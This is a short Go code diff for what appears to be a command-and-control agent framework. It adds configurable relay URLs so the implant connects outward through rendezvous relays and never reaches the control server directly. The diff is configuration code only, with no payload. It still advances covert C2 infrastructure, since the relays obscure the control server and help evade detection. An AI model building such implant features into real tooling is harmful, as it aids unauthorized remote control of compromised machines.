@@ -39,6 +39,7 @@ type AgentConfig struct {
 	PollInterval        *int
 	Jitter              *int
 	OperatorIdleTimeout *int
+	RelayURLs           *[]string
 }
 
 // MakeConfig takes the generalized AgentConfig options and orchestrates the
@@ -132,6 +133,14 @@ func MakeConfig(opts AgentConfig) error {
 	}
 	if live.RuntimeConfig.C2ChannelMode == "" {
 		live.RuntimeConfig.C2ChannelMode = def.C2ChannelModeDefault
+	}
+
+	// Rendezvous relay endpoints (worker_ws channel): agent dials OUT to these
+	// instead of connecting to CC directly. Each URL is an independent room;
+	// agent identity survives relay loss via end-to-end MsgAuth.
+	if opts.RelayURLs != nil && len(*opts.RelayURLs) > 0 {
+		live.RuntimeConfig.RelayURLs = *opts.RelayURLs
+		logging.Infof("Relay endpoints: %d configured", len(*opts.RelayURLs))
 	}
 	if _, err := transport.GetC2ChannelWrapper(live.RuntimeConfig.C2ChannelMode); err != nil {
 		return fmt.Errorf("invalid c2-channel-mode: %s (available: %s)", live.RuntimeConfig.C2ChannelMode, strings.Join(transport.AllC2ChannelModes(), ","))
